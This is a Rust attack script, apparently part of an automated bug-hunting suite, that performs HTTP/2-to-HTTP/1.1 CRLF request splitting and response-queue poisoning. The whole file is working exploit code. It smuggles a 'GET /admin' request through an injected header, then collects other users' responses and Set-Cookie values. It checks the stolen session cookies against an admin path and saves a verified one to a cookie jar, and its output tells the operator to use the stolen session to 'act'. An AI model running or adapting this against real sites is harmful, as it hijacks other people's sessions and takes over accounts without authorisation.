#!/usr/bin/env rust-script
//! name: h2_rq_sustain
//! description: H2->H1 CRLF-split response-queue-poisoning sustainer - re-arms the CRLF split on a fresh h2 connection each time the front-end recycles its back-end connection (~10 requests on the academy H2 downgrade labs), and paces plain probes on the held connection so a victim request served over the same shared upstream leaves its own response (login 302 + Set-Cookie) on one of our streams; every foreign response is kept (status/location/Set-Cookie/snippet), candidate sessions are deduped and verified against --verify-path, and a verified session is written as an http_session jar.
//! version: 1.0.0
//! args: <base-url> [--path /] [--smuggle 'GET /admin HTTP/1.1'] [--hold-ms N] [--read-ms N] [--probes-per-conn N] [--gap-ms N] [--verify-path /admin] [--out JAR] [--max-seconds N] [--selftest]
//! keywords: 漏洞猎手套件, hunter, h2, http2, crlf, injection, request-splitting, request-smuggling, response-queue-poisoning, session-theft, hpack, sustain
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const HOME_MARKER: &str = "Search the blog";
const DENIED_MARKER: &str = "only available if logged in as an administrator"; // binding-exempt: server response marker literal

struct Opts {
    host: String,
    port: u16,
    path: String,
    smuggle: String,
    hold_ms: u64,
    read_ms: u64,
    probes_per_conn: u32,
    gap_ms: u64,
    verify_path: String,
    out: Option<String>,
    max_seconds: f64,
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let v = inject_value("GET /admin HTTP/1.1", "lab.test");
        let c = cookie_value("session=abc123; Secure", "session").unwrap_or_default();
        let ok = v.starts_with("\r\n\r\n")
            && v.contains("GET /admin HTTP/1.1\r\nHost: lab.test")
            && c == "abc123";
        pi_rust_lib::report::success(
            "h2_rq_sustain",
            json!({"selftest": if ok { "ok" } else { "fail" }, "inject": v, "cookie": c}),
            "run against the target base url",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut o = Opts {
        host: String::new(),
        port: 443,
        path: "/".to_string(),
        smuggle: "GET /admin HTTP/1.1".to_string(),
        hold_ms: 500,
        read_ms: 600,
        probes_per_conn: 8,
        gap_ms: 150,
        verify_path: "/admin".to_string(),
        out: None,
        max_seconds: 0.0,
    };
    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    o.max_seconds = (budget - 45.0).max(20.0);
    let mut i = 0;
    while i < args.len() {
        let next = |i: usize| args.get(i + 1).cloned();
        match args[i].as_str() {
            "--path" => {
                if let Some(v) = next(i) {
                    o.path = v;
                }
                i += 1;
            }
            "--smuggle" => {
                if let Some(v) = next(i) {
                    o.smuggle = v;
                }
                i += 1;
            }
            "--hold-ms" => {
                o.hold_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.hold_ms);
                i += 1;
            }
            "--read-ms" => {
                o.read_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.read_ms);
                i += 1;
            }
            "--probes-per-conn" => {
                o.probes_per_conn = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.probes_per_conn).max(1);
                i += 1;
            }
            "--gap-ms" => {
                o.gap_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.gap_ms);
                i += 1;
            }
            "--verify-path" => {
                if let Some(v) = next(i) {
                    o.verify_path = v;
                }
                i += 1;
            }
            "--out" => {
                o.out = next(i);
                i += 1;
            }
            "--max-seconds" => {
                o.max_seconds = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.max_seconds);
                i += 1;
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "h2_rq_sustain",
            "missing base url",
            "call as: h2_rq_sustain <base-url> [--hold-ms 500] [--verify-path /admin] [--out JAR]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    o.host = parsed.host_str().unwrap_or("").to_string();
    o.port = parsed.port().unwrap_or(443);

    match tokio::time::timeout(Duration::from_secs_f64(budget), run(&o)).await {
        Ok(Ok(data)) => {
            let next = if data["verified_session"].is_string() {
                "session stolen -> http_session with the written jar to reach /admin and act"
            } else if data["foreign_count"].as_u64().unwrap_or(0) > 0 {
                "foreign responses seen -> inspect foreign_rows, then rerun with more time"
            } else {
                "no foreign response: rerun longer (the victim's own requests must land on the shared upstream)"
            };
            pi_rust_lib::report::success("h2_rq_sustain", data, next).unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2_rq_sustain", &e, "check the base url / the split payload shape");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure("h2_rq_sustain", &format!("deadline {budget}s reached"), "lower --max-seconds or raise PI_TIMEOUT_SECS");
            std::process::exit(1);
        }
    }
}

fn inject_value(smuggle: &str, host: &str) -> String {
    // The front-end copies the header value verbatim into the downgraded HTTP/1.1
    // request and its own trailing CRLF closes the smuggled request line + Host.
    format!("\r\n\r\n{smuggle}\r\nHost: {host}\r\n")
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn send_request(
    tls: &mut TlsStream<TcpStream>,
    sid: u32,
    host: &str,
    path: &str,
    inject: Option<&str>,
) -> Result<(), String> {
    let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    if let Some(v) = inject {
        headers.push((b"x-arm".to_vec(), v.as_bytes().to_vec()));
    }
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

/// Read until the target stream's response is complete (or the idle window closes).
async fn read_one(tls: &mut TlsStream<TcpStream>, dec: &mut hpack::Decoder<'_>, target: u32, read_ms: u64) -> Value {
    let mut status: Option<String> = None;
    let mut location: Option<String> = None;
    let mut cookies: Vec<String> = Vec::new();
    let mut body_len = 0usize;
    let mut sample = String::new();
    let mut ended = false;
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(hs) = dec.decode(&payload) {
                    if sid == target {
                        for h in hs.iter() {
                            let n: &[u8] = &h.0;
                            let v: &[u8] = &h.1;
                            if n == b":status" {
                                status = Some(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"set-cookie") {
                                cookies.push(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"location") {
                                location = Some(String::from_utf8_lossy(v).to_string());
                            }
                        }
                    }
                }
                if sid == target && flags & 0x1 != 0 {
                    ended = true;
                }
            }
            0 => {
                if sid == target {
                    body_len += payload.len();
                    if sample.len() < 4000 {
                        sample.push_str(&String::from_utf8_lossy(&payload));
                    }
                    if flags & 0x1 != 0 {
                        ended = true;
                    }
                }
            }
            3 => {
                if sid == target {
                    ended = true;
                }
            }
            _ => {}
        }
        if ended {
            break;
        }
    }
    let foreign = status.as_deref() != Some("200") || !sample.contains(HOME_MARKER);
    json!({
        "status": status,
        "location": location,
        "len": body_len,
        "foreign": foreign,
        "denied": sample.contains(DENIED_MARKER),
        "set_cookie": cookies,
        "snippet": sample.chars().take(200).collect::<String>(),
    })
}

fn cookie_value(set_cookie: &str, name: &str) -> Option<String> {
    let needle = format!("{name}=");
    let idx = set_cookie.find(&needle)?;
    let mut out = String::new();
    for c in set_cookie[idx + needle.len()..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

fn window(page: &str, idx: usize, back: usize, fwd: usize) -> String {
    let mut start = idx.saturating_sub(back);
    while start < page.len() && !page.is_char_boundary(start) {
        start += 1;
    }
    let mut end = (idx + fwd).min(page.len());
    while end > start && !page.is_char_boundary(end) {
        end -= 1;
    }
    page[start..end].to_string()
}

/// Plain HTTP/1.1 GET over TLS with Connection: close; returns (status, body).
async fn http1_get(
    cfg: Arc<ClientConfig>,
    host: &str,
    port: u16,
    path: &str,
    cookie: Option<&str>,
) -> Result<(u16, String), String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(15), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let status = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    Ok((status, body))
}

/// One armed connection: inject, then pace probes until the connection dies.
struct ConnResult {
    probes: u32,
    died: bool,
    stale: u32,
    foreign: Vec<Value>,
    sessions: Vec<(String, bool)>,
}

async fn poisoned_window(o: &Opts, h2: Arc<ClientConfig>, inject: &str, deadline: Instant) -> Result<ConnResult, String> {
    let mut tls = h2_connect(h2, &o.host, o.port).await?;
    let mut dec = hpack::Decoder::new();
    let mut sid = 1u32;
    send_request(&mut tls, sid, &o.host, &o.path, Some(inject)).await?;
    let arm = read_one(&mut tls, &mut dec, sid, o.read_ms).await;
    let mut res = ConnResult { probes: 0, died: false, stale: 0, foreign: Vec::new(), sessions: Vec::new() };
    for c in arm["set_cookie"].as_array().cloned().unwrap_or_default() {
        if let Some(v) = c.as_str().and_then(|s| cookie_value(s, "session")) {
            res.sessions.push((v, false));
        }
    }
    sid += 2;
    for _ in 0..o.probes_per_conn {
        if Instant::now() >= deadline {
            break;
        }
        tokio::time::sleep(Duration::from_millis(o.hold_ms)).await;
        if send_request(&mut tls, sid, &o.host, &o.path, None).await.is_err() {
            res.died = true;
            break;
        }
        let row = read_one(&mut tls, &mut dec, sid, o.read_ms).await;
        res.probes += 1;
        if row["status"].is_null() {
            res.died = true;
        }
        let foreign = row["foreign"].as_bool().unwrap_or(false);
        if foreign {
            if row["denied"].as_bool().unwrap_or(false) && row["status"].as_str() == Some("401") {
                res.stale += 1;
            }
            if res.foreign.len() < 40 {
                res.foreign.push(row.clone());
            }
        }
        for c in row["set_cookie"].as_array().cloned().unwrap_or_default() {
            if let Some(v) = c.as_str().and_then(|s| cookie_value(s, "session")) {
                res.sessions.push((v, foreign));
            }
        }
        sid += 2;
        if res.died {
            break;
        }
    }
    drop(tls);
    Ok(res)
}

async fn run(o: &Opts) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let h2 = tls_config(&[b"h2"]);
    let inject = inject_value(&o.smuggle, &o.host);
    let deadline = Instant::now() + Duration::from_secs_f64(o.max_seconds);

    let mut conns = 0u32;
    let mut probes = 0u32;
    let mut stale_hits = 0u32;
    let mut dead_conns = 0u32;
    let mut foreign_rows: Vec<Value> = Vec::new();
    let mut candidates: Vec<(String, bool)> = Vec::new();
    let mut last_err: Option<String> = None;

    while Instant::now() < deadline {
        match poisoned_window(o, h2.clone(), &inject, deadline).await {
            Ok(res) => {
                conns += 1;
                probes += res.probes;
                stale_hits += res.stale;
                if res.died {
                    dead_conns += 1;
                }
                for r in res.foreign {
                    if foreign_rows.len() < 40 {
                        foreign_rows.push(r);
                    }
                }
                for c in res.sessions {
                    if !candidates.iter().any(|(v, _)| *v == c.0) {
                        candidates.push(c);
                    }
                }
                candidates.truncate(300);
            }
            Err(e) => last_err = Some(e),
        }
        if Instant::now() < deadline {
            tokio::time::sleep(Duration::from_millis(o.gap_ms)).await;
        }
    }

    let mut ordered: Vec<String> = Vec::new();
    for foreign_first in [true, false] {
        for (v, foreign) in candidates.iter() {
            if *foreign == foreign_first && !ordered.iter().any(|x| x == v) {
                ordered.push(v.clone());
            }
        }
    }
    ordered.truncate(150);

    let mut verified: Option<(String, u16, String)> = None;
    let mut tested = 0u32;
    for v in ordered.iter() {
        if verified.is_some() {
            break;
        }
        tested += 1;
        if let Ok((st, body)) = http1_get(h1.clone(), &o.host, o.port, &o.verify_path, Some(&format!("session={v}"))).await {
            if st == 200 && !body.contains(DENIED_MARKER) {
                verified = Some((v.clone(), st, window(&body, 0, 0, 300)));
                break;
            }
        }
    }

    let mut jar: Option<String> = None;
    if let Some((v, _, _)) = &verified {
        if let Some(p) = &o.out {
            let _ = std::fs::write(p, json!({ o.host.clone(): { "session": v } }).to_string());
            jar = Some(p.clone());
        }
    }

    Ok(json!({
        "host": o.host,
        "smuggle": o.smuggle,
        "inject": inject,
        "mode": "sustain-rearm",
        "connections": conns,
        "probes": probes,
        "dead_connections": dead_conns,
        "stale_401_hits": stale_hits,
        "foreign_count": foreign_rows.len(),
        "foreign_rows": foreign_rows,
        "candidates": candidates.len(),
        "candidates_tested": tested,
        "verified_session": verified.as_ref().map(|(v, _, _)| v.clone()),
        "verified": verified.as_ref().map(|(v, st, snip)| json!({"session": v, "status": st, "snippet": snip})),
        "jar": jar,
        "last_error": last_err,
    }))
}
